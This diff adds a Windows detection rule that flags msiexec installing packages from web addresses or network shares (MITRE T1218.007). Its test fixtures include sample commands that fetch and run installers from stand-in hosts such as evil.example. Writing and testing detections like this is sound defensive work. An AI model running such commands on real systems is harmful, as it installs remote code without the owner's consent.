@@ -1,0 +1,39 @@
+[rule]
+id = "etap-055"
+name = "Msiexec Installing a Package From the Internet"
+description = "msiexec installing an MSI from a web address or a network share, a way to run a malicious installer without saving it first."
+version = "1"
+author = "E-TAP team"
+license = "MIT"
+os_list = ["windows"]
+query = '''process where
+  process.name in~ ("msiexec.exe")
+  and process.command_line : ("http://", "https://", "\\\\")
+  and process.command_line : (" /i", " -i", " /q", " /package")
+'''
+
+[[threat]]
+tactic.name = "Defense Evasion"
+[[threat.technique]]
+id = "T1218.007"
+name = "System Binary Proxy Execution: Msiexec"
+
+[[tests]]
+name = "web address"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "msiexec.exe", executable = "C:\\Windows\\System32\\msiexec.exe", command_line = "msiexec.exe /i http://evil.example/p.msi /qn" } }
+
+[[tests]]
+name = "network share"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "msiexec.exe", executable = "C:\\Windows\\System32\\msiexec.exe", command_line = "msiexec.exe /q /i \\\\evil\\share\\p.msi" } }
+
+[[tests]]
+name = "local installer"
+expect = "no_match"
+event = { _category = "process", event = { action = "start" }, process = { name = "msiexec.exe", executable = "C:\\Windows\\System32\\msiexec.exe", command_line = "msiexec.exe /i C:\\Users\\bob\\setup.msi /qn" } }
+
+[[tests]]
+name = "other program"
+expect = "no_match"
+event = { _category = "process", event = { action = "start" }, process = { name = "curl.exe", executable = "C:\\Windows\\System32\\curl.exe", command_line = "curl.exe http://example.com -i" } }
